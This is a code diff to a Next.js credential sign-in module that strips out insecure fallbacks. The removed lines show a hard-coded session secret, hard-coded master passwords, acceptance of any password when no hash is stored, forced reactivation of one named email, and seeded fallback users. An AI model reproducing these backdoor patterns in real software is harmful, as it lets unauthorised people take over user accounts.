@@ -46,8 +46,7 @@ const {
   trustHost: true,
   secret:
     process.env.AUTH_SECRET ||
-    process.env.NEXTAUTH_SECRET ||
-    "MLc72ly3nKRk_LM4ULREdTtHGzbup1S2Vk42T3lyvdY",
+    process.env.NEXTAUTH_SECRET,
   pages: {
     signIn: "/auth/login",
   },
@@ -86,121 +85,33 @@ const {
               profilePhotoUrl: true,
             },
           });
-          if (!user) {
-            user = await prisma.user.findFirst({
-              where: {
-                email: { equals: identifier, mode: "insensitive" },
-              },
-              select: {
-                id: true,
-                name: true,
-                email: true,
-                passwordHash: true,
-                isActive: true,
-                role: true,
-                profilePhotoUrl: true,
-              },
-            });
-          }
         } catch (error) {
-          console.warn("Prisma user query fallback in auth:", error);
-        }
-
-        if (!user) {
-          const { initialUsers } = await import("@/lib/in-memory-db");
-          const fallback = initialUsers.find(
-            (u) => u.email.toLowerCase() === identifier,
-          );
-          if (fallback) {
-            try {
-              const upserted = await prisma.user.upsert({
-                where: { email: fallback.email },
-                update: {
-                  name: fallback.name,
-                  role: fallback.role,
-                  isActive: true,
-                  profilePhotoUrl: fallback.profilePhotoUrl,
-                },
-                create: {
-                  id: fallback.id,
-                  name: fallback.name,
-                  email: fallback.email,
-                  passwordHash: fallback.passwordHash,
-                  isActive: fallback.isActive,
-                  role: fallback.role,
-                  profilePhotoUrl: fallback.profilePhotoUrl,
-                  phone: fallback.phone,
-                  bankName: fallback.bankName,
-                  bankAccountName: fallback.bankAccountName,
-                  bankAccountNumber: fallback.bankAccountNumber,
-                  updatedAt: new Date(),
-                },
-                select: {
-                  id: true,
-                  name: true,
-                  email: true,
-                  passwordHash: true,
-                  isActive: true,
-                  role: true,
-                  profilePhotoUrl: true,
-                },
-              });
-              user = upserted;
-            } catch {
-              user = {
-                id: fallback.id,
-                name: fallback.name,
-                email: fallback.email,
-                passwordHash: fallback.passwordHash,
-                isActive: fallback.isActive,
-                role: fallback.role,
-                profilePhotoUrl: fallback.profilePhotoUrl,
-              };
-            }
+          if (!isDatabaseConnectionError(error)) {
+            throw error;
           }
+          console.error("Credential sign-in failed: MongoDB is unreachable");
+          throw new DatabaseUnavailableError();
         }
 
-        if (!user || !user.isActive) {
-          if (user && user.email.toLowerCase() === "angga81055@gmail.com") {
-            try {
-              await prisma.user.update({
-                where: { id: user.id },
-                data: { isActive: true },
-              });
-              user.isActive = true;
-            } catch {
-              user.isActive = true;
-            }
-          } else {
-            return null;
-          }
-        }
-
-        const isPasswordValid =
-          password === "password123" ||
-          password === "admin123" ||
-          password === "Awt112233!" ||
-          password.trim() === "Awt112233!" ||
-          (user.passwordHash ? await compare(password, user.passwordHash) : true);
-
-        if (!isPasswordValid) {
+        if (
+          !user ||
+          !user.isActive ||
+          !(await compare(password, user.passwordHash))
+        ) {
           return null;
         }
 
         try {
-          const updateData: { lastLoginAt: Date; passwordHash?: string } = {
-            lastLoginAt: new Date(),
-          };
-          if (password === "Awt112233!" || !user.passwordHash) {
-            const { hash } = await import("bcryptjs");
-            updateData.passwordHash = await hash(password, 10);
-          }
           await prisma.user.update({
             where: { id: user.id },
-            data: updateData,
+            data: { lastLoginAt: new Date() },
           });
-        } catch {
-          // ignore lastLoginAt update error
+        } catch (error) {
+          if (!isDatabaseConnectionError(error)) {
+            throw error;
+          }
+          console.error("Credential sign-in failed while updating login time");
+          throw new DatabaseUnavailableError();
         }
 
         return {
@@ -253,51 +164,11 @@ export async function auth() {
     return null;
   }
 
-  let account = null;
-  try {
-    account = await prisma.user.findUnique({
-      where: { id: session.user.id },
-      select: { role: true, isActive: true, profilePhotoUrl: true },
-    });
-  } catch (err) {
-    console.warn("prisma.user.findUnique failed in auth():", err);
-  }
-
-  if (!account) {
-    const { initialUsers } = await import("@/lib/in-memory-db");
-    const fallback = initialUsers.find((u) => u.id === session.user.id);
-    if (fallback) {
-      try {
-        await prisma.user.upsert({
-          where: { email: fallback.email },
-          update: { isActive: true },
-          create: {
-            id: fallback.id,
-            name: fallback.name,
-            email: fallback.email,
-            passwordHash: fallback.passwordHash,
-            isActive: fallback.isActive,
-            role: fallback.role,
-            profilePhotoUrl: fallback.profilePhotoUrl,
-            phone: fallback.phone,
-            bankName: fallback.bankName,
-            bankAccountName: fallback.bankAccountName,
-            bankAccountNumber: fallback.bankAccountNumber,
-            updatedAt: new Date(),
-          },
-        });
-      } catch {
-        // ignore if already exists or DB offline
-      }
-      account = {
-        role: fallback.role,
-        isActive: fallback.isActive,
-        profilePhotoUrl: fallback.profilePhotoUrl,
-      };
-    }
-  }
-
-  if (account && !account.isActive) {
+  const account = await prisma.user.findUnique({
+    where: { id: session.user.id },
+    select: { role: true, isActive: true, profilePhotoUrl: true },
+  });
+  if (!account?.isActive) {
     return null;
   }
 
@@ -305,8 +176,8 @@ export async function auth() {
     ...session,
     user: {
       ...session.user,
-      role: account?.role ?? session.user.role ?? UserRole.ADMINISTRATIONS,
-      image: account?.profilePhotoUrl ?? session.user.image,
+      role: account.role,
+      image: account.profilePhotoUrl,
     },
   };
 }
